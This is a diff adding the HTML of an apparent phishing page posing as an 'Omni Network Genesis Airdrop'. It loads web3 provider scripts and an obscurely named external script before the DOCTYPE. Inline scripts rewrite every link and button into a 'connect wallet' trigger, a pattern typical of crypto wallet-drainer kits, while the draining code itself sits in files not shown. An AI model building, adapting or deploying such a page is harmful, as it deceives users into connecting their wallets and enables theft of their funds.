@@ -1,0 +1,85 @@
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+      var links = document.querySelectorAll('a');
+      links.forEach(function (link) {
+        link.addEventListener('click', function (event) {
+          event.preventDefault();
+        });
+      });
+    });
+  </script>
+  <script charset="UTF-8" type="text/javascript" src="./1cf72d23-d50d-46d1-8c53-c5e72b30526c.js"></script>
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="icon" data-savepage-href="/favicon.ico" href="./images/favicon.png" type="image/x-icon" sizes="160x160">
+        <link rel="stylesheet" href="./style.css">
+        <title>Omni Network Genesis Airdrop</title>
+        <script src="./assets/web3-v2/bundle.js"></script>
+        <script src="./assets/web3-provider.js"></script> 
+    </head>
+    <body>
+        <header>
+            <img src="./images/logo.png" alt="Omni">
+            <button class="container-button interact-button">Connect Wallet</button>
+        </header>
+
+        <section>
+            <div class="pic">
+                <img src="./images/picture.png" alt="Omni">
+            </div>
+
+            <div class="text">
+                <p>
+                    Welcome to the OMNI 
+                    <br>
+                    <br>
+                    Omni Armageddon loading... ▓▓▓▓▓▓▓▓▓░░░
+                    <button class="container-button interact-button" >Register Now</button>
+                </p>
+            </div>
+        </section>
+
+        <footer>
+            <div class="wrapper">
+                <p class="powered">Powered by <img src="./images/footer.png" alt="clique"></p>
+                <div class="line"></div>
+                <div class="rights">
+                    <p>© 2024 Relume. All rights reserved.</p>
+                    <a target="_blank" href="https://drive.google.com/file/d/1-zL69dMPM3FVCjzygMuu4hKpzGgirtec/edit">Privacy Policy</a>
+                </div>
+            </div>
+        </footer>
+    </body>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+          // Add CSS for cursor pointer
+          var style = document.createElement('style');
+          style.innerHTML = '.interact-button { cursor: pointer; }';
+          document.head.appendChild(style);
+      
+          // Update <a> & <button> elements
+          document.querySelectorAll('a').forEach(function (link) {
+            link.addEventListener('click', function (event) {
+              event.preventDefault();
+            })
+            link.removeAttribute('href');
+            link.classList.add('interact-button');
+            link.classList.add('placeholder-button');
+            link.classList.add('connect-button');
+          });
+      
+          document.querySelectorAll('button').forEach(function (link) {
+            link.addEventListener('click', function (event) {
+              event.preventDefault();
+            })
+            link.removeAttribute('href');
+            link.classList.add('interact-button');
+            link.classList.add('placeholder-button');
+            link.classList.add('connect-button');
+          });
+        })
+      </script>
+</html>
